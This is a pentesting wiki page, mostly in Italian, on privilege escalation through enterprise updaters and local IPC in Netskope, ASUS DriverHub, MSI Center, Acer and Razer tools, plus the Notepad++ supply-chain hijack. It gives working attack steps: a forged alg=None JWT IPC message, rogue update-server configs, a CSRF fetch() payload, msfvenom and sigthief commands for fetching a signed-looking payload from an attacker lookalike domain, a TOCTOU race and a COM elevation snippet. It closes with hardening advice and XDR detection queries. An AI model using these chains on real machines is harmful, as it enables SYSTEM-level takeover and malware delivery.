# Abuso degli Auto-Updater aziendali e dell'IPC privilegiato (es., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di local privilege escalation su Windows trovate in agenti endpoint aziendali e updaters che espongono una superficie IPC a bassa frizione e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente a basso privilegio può costringere l'enrollment verso un server controllato dall'attaccante e poi consegnare un MSI maligno che il servizio SYSTEM installa.

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell'IPC localhost di un servizio privilegiato per forzare la reiscrizione o la riconfigurazione verso un server controllato dall'attaccante.
- Implementare gli endpoint di update del vendor, consegnare una Trusted Root CA rogue, e puntare l'updater a un pacchetto maligno "signed".
- Eludere controlli di signer deboli (CN allow-lists), flag di digest opzionali e proprietà MSI permissive.
- Se l'IPC è "encrypted", derivare key/IV da identificatori macchina leggibili globalmente memorizzati nel registry.
- Se il servizio limita i caller per image path/process name, injectare in un processo allow-listed o generarne uno suspended e bootstrapare la tua DLL tramite una minimal thread-context patch.

---
## 1) Forzare l'enrollment verso un server attaccante via localhost IPC

Molti agenti includono un processo UI in user-mode che comunica con un servizio SYSTEM via localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell'exploit:
1) Creare un JWT enrollment token i cui claims controllano l'host backend (es., AddonUrl). Usare alg=None così non è richiesta una signature.
2) Inviare il messaggio IPC invocando il comando di provisioning con il tuo JWT e il tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo server controllato dall'attaccante per enrollment/config, ad es.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del chiamante è basata su percorso/nome, origina la richiesta da un eseguibile del vendor presente nella allow-list (vedi §4).

---
## 2) Dirottare il canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint attesi e indirizzalo verso un MSI dell'attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituire una config JSON con un intervallo di aggiornamento molto breve, ad es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA in formato PEM. Il servizio lo installa nello store Trusted Root della macchina locale.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione fittizia.

Bypass dei controlli comuni riscontrati in the wild:
- Allow-list del Signer CN: il servizio può semplicemente verificare che il Subject CN sia “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un certificato leaf con quel CN e firmare l'MSI.
- CERT_DIGEST property: includi una proprietà MSI benigno chiamata CERT_DIGEST. Nessun controllo durante l'installazione.
- Optional digest enforcement: un flag di configurazione (es., check_msi_digest=false) disabilita la validazione crittografica aggiuntiva.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

A partire da R127, Netskope incapsulava il JSON dell'IPC in un campo encryptData che somiglia a Base64. Il reversing ha mostrato AES con key/IV derivati da valori di registro leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare comandi cifrati validi da un utente standard. Suggerimento generale: se un agent improvvisamente “encrypts” la sua IPC, cerca device ID, product GUID, install ID sotto HKLM come materiale.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine con i binari vendor in allow-list situati sotto Program Files (es. stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo in allow-list (es. nsdiag.exe) e proxy dell'IPC dall'interno.
- Spawn di un binario in allow-list in stato sospeso e bootstrap della tua DLL proxy senza CreateRemoteThread (vedi §5) per soddisfare le regole di tamper imposte dal driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

I prodotti spesso distribuiscono un driver minifilter/OB callbacks (es. Stadrv) per rimuovere diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader in user-mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binario vendor con CREATE_SUSPENDED.
2) Ottieni gli handle che ti sono ancora permessi: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo, e un handle di thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME se patchi codice a un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk mappato precocemente e garantito) con un piccolo stub che chiama LoadLibraryW sul path della tua DLL, poi salta indietro.
4) ResumeThread per far partire il tuo stub in-process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (l'hai creato tu), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizza una rogue CA, la firma di MSI malevoli, e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un client IPC custom che costruisce messaggi IPC arbitrari (opzionalmente AES-encrypted) e include l'injection via processo sospeso per partire da un binario in allow-list.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Quando ti trovi davanti a un nuovo endpoint agent o a una suite “helper” della motherboard, un workflow rapido è di solito sufficiente per capire se stai guardando un target promettente per privesc:

1) Enumera i listener loopback e mappali ai processi del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerare le candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Estrai dati di routing basati sul registry usati dai plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user-mode. Packed Electron/.NET frontends frequentemente leak l'intero schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Se il target autentica i caller solo tramite PID, image path o process name, consideralo più un ostacolo che un confine: iniettare nel client legittimo, o stabilire la connessione da un allow-listed process, spesso è sufficiente per soddisfare i controlli del server. Per le named pipes in particolare, [questa pagina su client impersonation and pipe abuse](named-pipe-client-impersonation.md) approfondisce la primitive.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub fornisce un servizio HTTP in user-mode (ADU.exe) su 127.0.0.1:53000 che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro di Origin esegue semplicemente `string_contains(".asus.com")` sull'Origin header e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall'attaccante come `https://driverhub.asus.com.attacker.tld` passa quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript. Vedi [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori pattern di bypass.

Practical flow:
1) Registrare un dominio che incorpori `.asus.com` e ospitare lì una pagina web malevola.
2) Usare `fetch` o XHR per chiamare un endpoint privilegiato (es. `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Inviare il body JSON atteso dall'handler – il frontend JS minificato mostra lo schema qui sotto.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la PowerShell CLI mostrata qui sotto riesce quando l'header Origin viene spoofed al valore attendibile:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Gli updater basati su WinGUp per Notepad++ più vecchi non verificavano completamente l'autenticità degli aggiornamenti. Quando un attaccante comprometteva il provider di hosting del server di aggiornamento, poteva manomettere il manifest XML e reindirizzare solo client selezionati verso URL dell'attaccante. Poiché il client accettava qualsiasi risposta HTTPS senza imporre sia una catena di certificati trusted sia una firma PE valida, le vittime scaricavano ed eseguivano un trojanized NSIS `update.exe`.

Flusso operativo (nessun exploit locale richiesto):
1. **Infrastructure interception**: compromettere CDN/hosting e rispondere alle check di aggiornamento con metadati dell'attaccante che puntano a un URL di download malevolo.
2. **Trojanized NSIS**: l'installer fetches/executes un payload e sfrutta due catene di esecuzione:
- **Bring-your-own signed binary + sideload**: bundle il signed Bitdefender `BluetoothService.exe` e drop un `log.dll` malevolo nel suo search path. Quando il binario signed viene eseguito, Windows sideloads `log.dll`, che decripta e reflectively loads il backdoor Chrysalis (Warbird-protected + API hashing per ostacolare la rilevazione statica).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che usa Win32 APIs (e.g., `EnumWindowStationsW`) per injectare shellcode e stageare Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** dell'installer scaricato (pin vendor signer, reject mismatched CN/chain) e signare lo stesso update manifest (e.g., XMLDSig). Bloccare redirect controllati dal manifest a meno che non siano validati.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: generare alert quando un EXE signed del vendor carica un nome DLL da fuori il suo canonical install path (e.g., Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater drop/execute installer da temp con firme non-vendor.
- Monitorare malware-specific artifacts osservati in questa catena (utili come pivot generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%`, e stage di Lua-driven shellcode injection.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un installer non-Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi schemi si applicano a qualsiasi updater che accetti unsigned manifests o che non esegua pin degli installer signers — network hijack + malicious installer + BYO-signed sideloading porta a remote code execution sotto le spoglie di “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
